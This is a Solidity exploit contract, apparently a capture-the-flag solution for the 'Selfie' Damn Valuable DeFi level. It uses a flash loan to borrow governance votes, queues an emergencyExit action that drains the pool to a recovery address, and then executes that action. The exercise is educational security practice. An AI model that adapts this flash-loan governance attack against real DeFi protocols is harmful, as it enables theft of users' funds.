// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

contract SelfieExploit is IERC3156FlashBorrower {
    uint256 actionId;

    address private immutable _recovery;

    SelfiePool private immutable _pool;
    DamnValuableVotes private immutable _token;
    SimpleGovernance private immutable _governance;

    bytes32 public constant CALLBACK_SUCCESS =
        keccak256("ERC3156FlashBorrower.onFlashLoan");

    constructor(
        address pool,
        address governance,
        address token,
        address recovery
    ) {
        _pool = SelfiePool(pool);
        _token = DamnValuableVotes(token);
        _governance = SimpleGovernance(governance);

        _recovery = recovery;
    }

    function onFlashLoan(
        address,
        address,
        uint256 amount,
        uint256,
        bytes calldata
    ) external returns (bytes32) {
        _token.delegate(address(this)); // enable voting power

        actionId = _governance.queueAction(
            address(_pool),
            0,
            abi.encodeCall(_pool.emergencyExit, address(_recovery))
        );

        _token.approve(msg.sender, amount); // allow pool to pull funds back

        return CALLBACK_SUCCESS;
    }

    function queueAction() external {
        _pool.flashLoan(
            IERC3156FlashBorrower(address(this)),
            address(_token),
            _token.balanceOf(address(_pool)),
            ""
        );
    }

    function executeAction() external {
        _governance.executeAction(actionId);
    }
}
